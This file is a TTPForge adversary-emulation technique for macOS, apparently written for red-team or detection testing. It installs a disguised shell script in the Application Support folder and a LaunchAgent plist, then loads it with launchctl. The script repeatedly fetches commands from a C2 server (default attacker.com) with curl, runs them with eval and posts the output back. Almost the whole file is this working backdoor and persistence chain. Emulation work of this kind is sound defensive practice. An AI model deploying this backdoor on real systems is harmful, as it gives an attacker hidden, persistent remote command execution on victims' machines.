---
api_version: 2.0
uuid: 76960d76-5445-459c-87c6-bd2ebc123bf2
name: Application support directory backdoor
authors:
- TTPForge
description: |
  Creates backdoor in application support directory for stealthy persistence
mitre:
  tactics:
  - TA0003 Persistence
  techniques:
  - T1574 Hijack Execution Flow
requirements:
  platforms:
  - os: darwin
args:
- name: app_support_dir
  description: Path to application support directory
  type: string
  default: ~/Library/Application Support/SystemServices
- name: backdoor_name
  description: Name of backdoor executable
  type: string
  default: service_monitor
- name: loader_plist
  description: Path to loader plist
  type: string
  default: ~/Library/LaunchAgents/com.system.services.loader.plist
- name: c2_url
  description: C2 server base URL for command and control
  type: string
  default: http://attacker.com
steps:
- name: create_app_support_directory
  inline: mkdir -p {{ .Args.app_support_dir }}
- name: create_backdoor_executable
  create_file: '{{ .Args.app_support_dir }}/{{ .Args.backdoor_name }}'
  contents: |
    #!/bin/bash
    # Application support backdoor
    # Provides persistent command execution capability

    BACKDOOR_HOME="{{ .Args.app_support_dir }}"
    LOG_FILE="${BACKDOOR_HOME}/.logs"

    # Create log directory
    mkdir -p "${BACKDOOR_HOME}/.logs"

    # Establish reverse shell or C2 connection
    while true; do
      # Attempt to connect to command server
      COMMAND=$(curl -s "{{ .Args.c2_url }}/getcommand?id=$(hostname)" 2>/dev/null)
      if [ ! -z "$COMMAND" ]; then
        OUTPUT=$(eval "$COMMAND" 2>&1)
        curl -s -X POST -d "output=$OUTPUT" "{{ .Args.c2_url }}/sendoutput" 2>/dev/null
      fi
      sleep 300
    done
  mode: 493
  cleanup: default
- name: create_loader_plist
  create_file: '{{ .Args.loader_plist }}'
  contents: |
    <?xml version="1.0" encoding="UTF-8"?>
    <!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
    <plist version="1.0">
    <dict>
        <key>Label</key>
        <string>com.system.services.loader</string>
        <key>ProgramArguments</key>
        <array>
            <string>{{ .Args.app_support_dir }}/{{ .Args.backdoor_name }}</string>
        </array>
        <key>RunAtLoad</key>
        <true/>
        <key>KeepAlive</key>
        <true/>
        <key>StandardOutPath</key>
        <string>{{ .Args.app_support_dir }}/.logs/stdout.log</string>
        <key>StandardErrorPath</key>
        <string>{{ .Args.app_support_dir }}/.logs/stderr.log</string>
    </dict>
    </plist>
  mode: 420
  cleanup: default
- name: load_via_launchctl
  inline: launchctl load {{ .Args.loader_plist }}
  cleanup:
    inline: |-
      launchctl unload {{ .Args.loader_plist }}
      rm -f "{{ .Args.loader_plist }}"
      rm -rf {{ .Args.app_support_dir }}
tests:
- name: dry_run_test
  dry_run: true
